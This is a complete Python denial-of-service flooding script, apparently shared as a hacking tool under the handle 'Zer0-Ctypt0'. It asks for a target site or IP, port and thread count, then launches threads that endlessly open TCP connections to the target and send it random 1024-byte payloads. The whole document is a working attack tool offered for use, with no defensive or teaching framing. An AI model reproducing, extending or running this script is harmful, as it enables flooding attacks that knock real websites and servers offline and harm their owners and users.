import socket
import os
import time
import threading

# Banner
print("--- Welcome ---") 
print("-- X_X Are U Ready Explosion X_X --")
print("Github: ZCTools")
print("Instagram: zer0crypt0")
print("{-- By: Zer0-Ctypt0 --}")
time.sleep(2)
os.system("clear")

target_Host = str(input("Please enter target Web site or IP: "))
data = os.urandom(1024)  # Rastgele 1024 bayt veri oluşturma
connection_Time = int(input("Please Enter Connection(s): "))
threads_Number = int(input("Please Enter Threads Number: "))
target_IP_Address = socket.gethostbyname(target_Host)
target_Port_Number = int(input("Please Enter Target Port Number(Default -> 80): "))

print("---------------------------------------------------")
print("Checking IP Address and Port number...")
print(f" [{{{target_IP_Address}}}] ")
print(f" [{{{target_Port_Number}}}] ")
print(f" {{[Attacking: {target_Host} Please Wait...]}} ")
print("---------------------------------------------------")

def start_Ddos():
    while True:
        ddos_Attack = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            ddos_Attack.connect((target_IP_Address, target_Port_Number))  # Connection Target Host
            ddos_Attack.send(data)
            for _ in range(connection_Time):
                ddos_Attack.send(data)
        except Exception as e:
            print(f"Error: {e}")
        finally:
            ddos_Attack.close()

for _ in range(threads_Number):
    th = threading.Thread(target=start_Ddos)
    th.start()
